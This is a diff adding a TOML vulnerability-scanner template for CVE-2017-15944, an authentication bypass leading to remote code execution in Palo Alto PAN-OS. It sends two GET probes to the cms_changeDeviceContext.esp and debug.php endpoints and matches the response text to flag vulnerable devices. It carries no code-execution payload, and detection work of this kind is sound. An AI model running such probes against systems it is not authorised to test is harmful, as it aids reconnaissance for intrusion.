@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 Palo Alto Networks PAN-OS 管理接口认证绕过导致远程代码执行漏洞"
+id = "POC-AVE-2017-0520"
+name = "CVE-2017-15944 PoC"
+severity = "critical"
+tags = ["cve-2017-15944"]
+vuln_id = [
+    "CVE-2017-15944",
+    "AVE-2017-0520",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/esp/cms_changeDeviceContext.esp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["@start@Success@end@"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/php/utils/debug.php"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "PHPSESSID=test;"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Debug Console"]
